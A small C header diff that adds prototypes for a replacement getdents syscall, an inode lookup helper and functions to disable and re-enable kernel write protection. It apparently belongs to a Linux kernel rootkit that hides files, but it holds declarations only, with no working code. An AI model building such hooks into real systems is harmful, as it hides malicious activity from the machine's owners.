@@ -34,5 +34,10 @@ struct linux_dirent {
 	char d_name[];
 };
 
+asmlinkage int my_getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
+unsigned long get_inode_no(char *path_name);
+void disable_write_protect_mode(void);
+void enable_write_protect_mode(void);
+
 
 #endif
